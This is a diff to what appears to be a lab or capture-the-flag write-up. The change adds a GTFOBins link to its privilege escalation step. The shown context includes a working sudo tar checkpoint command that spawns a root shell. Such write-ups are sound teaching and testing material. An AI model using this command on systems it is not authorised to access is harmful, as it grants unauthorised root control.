@@ -67,7 +67,7 @@ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 ## 6. Privilege escalation
 - Checked sudo privileges with sudo -l
   ![img](https://github.com/user-attachments/assets/abb20d05-a1bd-4915-9d00-49bb56e1343a)
-- Using known technique (GTFOBins entry for tar), I was able to leverage this to spawn a root shell
+- Using known technique ([GTFOBins](https://gtfobins.github.io/gtfobins/tar/#sudo) entry for tar), I was able to leverage this to spawn a root shell
  ```bash
  $ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 ```
